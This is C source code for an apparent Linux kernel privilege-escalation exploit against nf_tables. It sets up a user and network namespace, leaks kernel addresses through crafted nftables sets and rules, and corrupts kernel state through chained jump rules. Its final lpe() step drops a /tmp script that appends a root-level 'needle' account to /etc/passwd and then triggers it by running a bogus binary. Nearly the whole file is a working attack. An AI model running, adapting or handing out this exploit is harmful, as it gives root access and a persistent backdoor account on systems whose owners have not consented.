#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>	/* for offsetof */
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>
#include <sched.h>

#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <limits.h>
#include "helpers.h"

int read_file(char *path, unsigned long long * addr)
{
	char buffer[1024];
	char *endptr;
	FILE *file = fopen(path, "r");
	unsigned long long num[10];
	unsigned int i = 0;
	if (file == NULL) {
		perror("open error");
		return 1;
	}
	
	while (fgets(buffer, sizeof(buffer), file) != NULL) {
		num[i] = strtoll(buffer, &endptr, 16);
		if (num[i] != 0 && num[i] != 0xffffffff)
			i++;
	}
	//printf("num[0]:0x%x\n", ntohl(num[0]));
	//printf("num[1]:0x%x\n", ntohl(num[1]));
	addr[0] = ((unsigned long long)ntohl(num[1])) | 0xffffffff00000000;
	addr[1] = (((unsigned long long)ntohl(num[2])) | (unsigned long long)(ntohl(num[3])) << 32);
	//printf("addr[0]:0x%llx\n", addr[0]);
	//printf("addr[1]:0x%llx\n", addr[1]);
	//if (*addr == 0xffffff0000000000)
	//	return 1;
	return 0;
}

void lpe()
{
    	system("echo '#!/bin/sh\necho needle:M6Jplzqa7rJp.:0:0:root:/root:/bin/sh >> /etc/passwd' > /tmp/windprobe");
    	system("chmod +x /tmp/windprobe");
	system("echo '\xff\xff\xff\xff' > /tmp/exec");
	system("chmod 777 /tmp/exec");
	execl("/tmp/exec", "/tmp/exec", (char *)NULL);
}


int main(int argc, char* argv[], char *envp[])
{

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(getpid(), sizeof(cpu_set_t), &set);
    
    if (argc < 2) {
        puts("[+] Dropping into network namespace");
    
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        puts("Recompile the exploit with an appropriate unshare path.");
        exit(EXIT_FAILURE);
    }
    
    if (strcmp("EXPLOIT", argv[1])) {
        puts("[-] Something went wrong...");
        exit(EXIT_FAILURE);
    }
    system("./setup.sh");
    
	char *table_name = "poc_table";
	char *chain_name = "poc_chain";
	char *set_name = "poc_set";
	char *dev_name = "eth32";
	struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
	
	/* 1. create table */
	printf("[1] create table\n");
	int seq = time(NULL);
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0 ) {
		perror("[-] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	if (create_table(nl, table_name, NFPROTO_NETDEV, &seq, NULL))
	{
		perror("[-] create table");
		exit(-1);
	}
	
	/* 2. create chain */
	printf("[2] create chain\n");
	struct unft_base_chain_param up;
	up.hook_num = NF_NETDEV_INGRESS;
	up.prio = INT_MIN;
	if (create_chain(nl, table_name, chain_name,  NFPROTO_NETDEV, &up, &seq, NULL, dev_name))
	{
		perror("[-] create chain");
		exit(-1);
	}
	
	printf("[3] create set\n");
	if (create_set(nl, table_name, set_name, NFPROTO_NETDEV, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);
	}
	
	printf("[4] create rule\n");
	if(leak_rule(nl, table_name, chain_name, set_name, NFPROTO_NETDEV, NULL, &seq))
	{
		perror("[-] create rule\n");
		exit(-1);
	}
	//sleep(5);
	printf("wait leak\n");
	//sleep(4);
	getchar();
	printf("[5] send packet\n");
	if (send_packet())
	{
		perror("[-] send packet\n");
		exit(-1);
	}
	system("nft list map netdev poc_table poc_set | grep -Eo \'0x[0-9a-fA-F]+\' > output.txt");
	//sleep(5);
	unsigned long long addr[2];
	if (!read_file("./output.txt", addr))
		printf("Discover vulnerabilities!\n");
	else
	{
		printf("No vulnerabilities found\n");
		exit(-1);
	}
	unsigned long long textbase = addr[0] - 0xc0c133;
	unsigned long long regbase = addr[1];
	printf("textbase:0x%llx\n", textbase);
	printf("regbase:0x%llx\n", regbase);
	
	/* exploit */
	char *exploit_table_name = "exploit_table";
	char *exploit_chain_name = "exploit_chain";
	char *exploit_dev_name = "eth32";	
	if (create_table(nl, exploit_table_name, NFPROTO_NETDEV, &seq, NULL))
	{
		perror("[-] create exploit table");
		exit(-1);
	}	
	
	up.hook_num = NF_INET_PRE_ROUTING;
	up.prio = 10;	

	if (create_chain(nl, exploit_table_name, exploit_chain_name,  NFPROTO_NETDEV, &up, &seq, NULL, dev_name))
	{
		perror("[-] create exploit chain");
		exit(-1);
	}
		
	// add stackptr
	for (int i = 0; i <= 8; i++)
	{
		char jump_chain[20];
		sprintf(jump_chain, "%d", i);
		if (i == 8)
			sprintf(jump_chain, "%s", "final_chain");
		if (create_chain(nl, exploit_table_name, jump_chain,  NFPROTO_NETDEV, NULL, &seq, NULL, dev_name))
		{
			perror("[-] create exploit chain");
			exit(-1);
		}
	}

	if (create_jump(nl, exploit_table_name, exploit_chain_name, NFPROTO_NETDEV, NULL, &seq))
	{
		perror("[-] create_jump");
		exit(-1);
	}
	
	for (int i = 0; i <= 7; i++)
	{
		char name[10];
		sprintf(name, "%d", i);
		if(jmp(nl, exploit_table_name, name, NFPROTO_NETDEV, NULL, &seq))
		{
			perror("[-] jump rule\n");
			exit(-1);			
		}
	}
	
 
	printf("wait pwn\n");
	//sleep(4);
	getchar();
	if(pwn(nl, exploit_table_name, "final_chain", NFPROTO_NETDEV, NULL, &seq, &textbase, &regbase))
	{
		perror("[-] create rule\n");
		exit(-1);
	}

	if (send_packet())
	{
		perror("[-] send packet\n");
		exit(-1);
	}
	printf("wait lpe\n");
	sleep(4);
	lpe();		
}
